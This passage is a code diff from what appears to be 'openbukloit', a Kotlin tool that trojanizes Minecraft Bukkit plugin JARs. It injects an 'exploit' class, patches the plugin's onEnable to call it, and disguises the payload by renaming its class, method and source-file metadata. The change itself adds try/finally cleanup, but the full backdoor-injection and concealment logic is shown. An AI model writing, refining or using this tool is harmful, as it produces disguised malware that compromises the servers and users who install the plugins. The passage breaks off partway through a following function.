@@ -28,116 +28,123 @@ fun process(
         return
     }
     val tempJar = File("./.openbukloit/temp/current.jar")
-    if (tempJar.exists()) tempJar.delete()
-    input.copyTo(tempJar)
+    val patchedDir = File("./.openbukloit/temp/patched")
 
-    val camouflage = if (noCamouflage)
-        Camouflage(className?.replace(".", "/") ?: exploit.name, methodName ?: "inject")
-    else
-        calculateCamouflage(tempJar)
+    try {
+        if (tempJar.exists()) tempJar.delete()
+        input.copyTo(tempJar)
 
-    var fileSystem = FileSystems.newFileSystem(tempJar.toPath(), null)
+        val camouflage = if (noCamouflage)
+            Camouflage(className?.replace(".", "/") ?: exploit.name, methodName ?: "inject")
+        else
+            calculateCamouflage(tempJar)
 
-    val pluginData: Map<String, Any> = Yaml().load(fileSystem.getPath("/plugin.yml").inputStream())
-    val pluginName = if (pluginData.containsKey("name")) pluginData["name"] as String
-    else throw Exception("No name found in plugin.yml")
-    val pluginMainClass = if (pluginData.containsKey("main")) pluginData["main"] as String
-    else throw Exception("No main class found in plugin.yml")
-    val pluginMainClassFile = pluginMainClass.replace(".", "/") + ".class"
+        var fileSystem: FileSystem? = null
+        try {
+            fileSystem = FileSystems.newFileSystem(tempJar.toPath(), null)
 
-    Logs.info("Plugin name: ${brightCyan(pluginName)}")
-    Logs.info("Plugin main class: ${brightCyan(pluginMainClass)}")
+            val pluginData: Map<String, Any> = Yaml().load(fileSystem.getPath("/plugin.yml").inputStream())
+            val pluginName = if (pluginData.containsKey("name")) pluginData["name"] as String
+            else throw Exception("No name found in plugin.yml")
+            val pluginMainClass = if (pluginData.containsKey("main")) pluginData["main"] as String
+            else throw Exception("No main class found in plugin.yml")
+            val pluginMainClassFile = pluginMainClass.replace(".", "/") + ".class"
 
-    val mainClass = ClassFile(fileSystem.getPath("/$pluginMainClassFile").inputStream().readBytes())
-    Logs.info(
-        "Main class version: ${
-            brightCyan(mainClass.version.toString())
-        } (Java ${
-            brightCyan(getJavaVersion(mainClass.version.major, mainClass.version.minor))
-        })"
-    )
+            Logs.info("Plugin name: ${brightCyan(pluginName)}")
+            Logs.info("Plugin main class: ${brightCyan(pluginMainClass)}")
 
-    Logs.info("Injecting exploit template...")
-    val originalExploitName = exploit.name
-    val tempExploitName = makeRandomLowerCaseString(20)
-    val tempExploitMethodName = makeRandomLowerCaseString(20)
-    exploit.name = tempExploitName
-    val exploitMethod = exploit.findInjectMethod()
-    exploitMethod.name = tempExploitMethodName
+            val mainClass = ClassFile(fileSystem.getPath("/$pluginMainClassFile").inputStream().readBytes())
+            Logs.info(
+                "Main class version: ${
+                    brightCyan(mainClass.version.toString())
+                } (Java ${
+                    brightCyan(getJavaVersion(mainClass.version.major, mainClass.version.minor))
+                })"
+            )
 
-    fileSystem.getPath("$tempExploitName.class").writeBytes(exploit.compile())
-    fileSystem = fileSystem.commit(tempJar.toPath())
+            Logs.info("Injecting exploit template...")
+            val originalExploitName = exploit.name
+            val tempExploitName = makeRandomLowerCaseString(20)
+            val tempExploitMethodName = makeRandomLowerCaseString(20)
+            exploit.name = tempExploitName
+            val exploitMethod = exploit.findInjectMethod()
+            exploitMethod.name = tempExploitMethodName
 
-    Logs.info("Patching main class...")
-    File("./.openbukloit/temp/patched").mkdirs()
-    runInjectOnJRE(
-        toJRE(requireJDK(mainClass.version.major, mainClass.version.minor)),
-        pluginMainClass,
-        "onEnable",
-        "{ $tempExploitName.$tempExploitMethodName(this); }",
-        "./.openbukloit/temp/patched",
-    )
+            fileSystem.getPath("$tempExploitName.class").writeBytes(exploit.compile())
+            fileSystem = fileSystem.commit(tempJar.toPath())
 
-    Logs.info("Injecting patched main class...")
-    Files.copy(
-        Paths.get("./.openbukloit/temp/patched/$pluginMainClassFile"),
-        fileSystem.getPath("/$pluginMainClassFile"),
-        StandardCopyOption.REPLACE_EXISTING
-    )
-    File("./.openbukloit/temp/patched").deleteRecursively()
+            Logs.info("Patching main class...")
+            patchedDir.mkdirs()
+            runInjectOnJRE(
+                toJRE(requireJDK(mainClass.version.major, mainClass.version.minor)),
+                pluginMainClass,
+                "onEnable",
+                "{ $tempExploitName.$tempExploitMethodName(this); }",
+                "./.openbukloit/temp/patched",
+            )
 
-    if (noCamouflage) Logs.info("Renaming exploit class...")
-    else Logs.info("Applying camouflage...")
-    val patchedMainClass = ClassFile(fileSystem.getPath("/$pluginMainClassFile").inputStream().readBytes())
-    for (entry in patchedMainClass.constantPool.entries) {
-        if (entry is ConstantClass) {
-            val nameConst = patchedMainClass.constantPool[entry.nameIndex] as ConstantUtf8
-            if (nameConst.value == exploit.name) nameConst.value = camouflage.className
-        }
-        if (entry is ConstantMethodref) {
-            val nameTypeConst = patchedMainClass.constantPool[entry.nameAndTypeIndex] as ConstantNameAndType
-            val nameConst = patchedMainClass.constantPool[nameTypeConst.nameIndex] as ConstantUtf8
-            if (nameConst.value == exploitMethod.name) nameConst.value = camouflage.methodName
-        }
-    }
-    fileSystem.getPath("/$pluginMainClassFile").writeBytes(patchedMainClass.compile(), StandardOpenOption.TRUNCATE_EXISTING)
-    exploit.name = camouflage.className
-    exploitMethod.name = camouflage.methodName
-    for (entry in exploit.constantPool.entries) {
-        if (entry is ConstantInvokeDynamic) {
-            val nameTypeConst = exploit.constantPool[entry.nameAndTypeIndex] as ConstantNameAndType
-            val descriptorConst = exploit.constantPool[nameTypeConst.descriptorIndex] as ConstantUtf8
-            val descriptorElements = descriptorConst.value.split(")")
-            val argElements = descriptorElements[0].split("(")[1].split(";")
-            descriptorConst.value = "(${
-                argElements.joinToString(";") {
-                    if (it == "L$originalExploitName") "L${camouflage.className}" else it
+            Logs.info("Injecting patched main class...")
+            Files.copy(
+                Paths.get("./.openbukloit/temp/patched/$pluginMainClassFile"),
+                fileSystem.getPath("/$pluginMainClassFile"),
+                StandardCopyOption.REPLACE_EXISTING
+            )
+
+            if (noCamouflage) Logs.info("Renaming exploit class...")
+            else Logs.info("Applying camouflage...")
+            val patchedMainClass = ClassFile(fileSystem.getPath("/$pluginMainClassFile").inputStream().readBytes())
+            for (entry in patchedMainClass.constantPool.entries) {
+                if (entry is ConstantClass) {
+                    val nameConst = patchedMainClass.constantPool[entry.nameIndex] as ConstantUtf8
+                    if (nameConst.value == exploit.name) nameConst.value = camouflage.className
                 }
-            })" + descriptorElements[1]
-        }
-    }
-    for (attr in exploit.attributes) {
-        if (attr.name == "SourceFile") {
-            val index = BinaryInt.from(attr.info).value
-            val sourceFileConst = exploit.constantPool[index] as ConstantUtf8
-            sourceFileConst.value = camouflage.className.substringAfterLast("/") + ".java"
-        }
-    }
-    Files.delete(fileSystem.getPath("$tempExploitName.class"))
+                if (entry is ConstantMethodref) {
+                    val nameTypeConst = patchedMainClass.constantPool[entry.nameAndTypeIndex] as ConstantNameAndType
+                    val nameConst = patchedMainClass.constantPool[nameTypeConst.nameIndex] as ConstantUtf8
+                    if (nameConst.value == exploitMethod.name) nameConst.value = camouflage.methodName
+                }
+            }
+            fileSystem.getPath("/$pluginMainClassFile").writeBytes(patchedMainClass.compile(), StandardOpenOption.TRUNCATE_EXISTING)
+            exploit.name = camouflage.className
+            exploitMethod.name = camouflage.methodName
+            for (entry in exploit.constantPool.entries) {
+                if (entry is ConstantInvokeDynamic) {
+                    val nameTypeConst = exploit.constantPool[entry.nameAndTypeIndex] as ConstantNameAndType
+                    val descriptorConst = exploit.constantPool[nameTypeConst.descriptorIndex] as ConstantUtf8
+                    val descriptorElements = descriptorConst.value.split(")")
+                    val argElements = descriptorElements[0].split("(")[1].split(";")
+                    descriptorConst.value = "(${
+                        argElements.joinToString(";") {
+                            if (it == "L$originalExploitName") "L${camouflage.className}" else it
+                        }
+                    })" + descriptorElements[1]
+                }
+            }
+            for (attr in exploit.attributes) {
+                if (attr.name == "SourceFile") {
+                    val index = BinaryInt.from(attr.info).value
+                    val sourceFileConst = exploit.constantPool[index] as ConstantUtf8
+                    sourceFileConst.value = camouflage.className.substringAfterLast("/") + ".java"
+                }
+            }
+            Files.delete(fileSystem.getPath("$tempExploitName.class"))
 
-    if (camouflage.className.contains("/")) {
-        val dir = fileSystem.getPath("${camouflage.className}.class").parent
-        if (!dir.exists()) dir.createDirectories()
-    }
-    fileSystem.getPath("${camouflage.className}.class").writeBytes(exploit.compile())
+            if (camouflage.className.contains("/")) {
+                val dir = fileSystem.getPath("${camouflage.className}.class").parent
+                if (!dir.exists()) dir.createDirectories()
+            }
+            fileSystem.getPath("${camouflage.className}.class").writeBytes(exploit.compile())
 
-    fileSystem.close()
-    tempJar.copyTo(output, true)
-    tempJar.delete()
-    Logs.finish().info("${input.name} patched successfully")
+        } finally {
+            fileSystem?.close()
+        }
+        tempJar.copyTo(output, true)
+        Logs.finish().info("${input.name} patched successfully")
+    } finally {
+        if (tempJar.exists()) tempJar.delete()
+        if (patchedDir.exists()) patchedDir.deleteRecursively()
+    }
 }
-
-fun runInjectOnJRE(jvm: Path, clazz: String, method: String, insert: String, saveTo: String) {
     val process = ProcessBuilder(
         jvm.toFile().canonicalPath,
         "-cp",
